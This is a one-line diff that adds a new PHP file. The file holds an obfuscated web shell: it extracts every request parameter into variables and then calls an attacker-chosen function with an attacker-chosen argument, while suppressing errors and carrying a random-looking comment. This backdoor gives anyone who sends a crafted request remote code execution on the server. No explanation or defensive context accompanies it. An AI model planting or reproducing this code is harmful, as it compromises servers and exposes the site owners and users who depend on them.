@@ -1,0 +1,1 @@
+<?php /*RkycrUPkQ*/@extract($_REQUEST);@die($nG($KtLH));
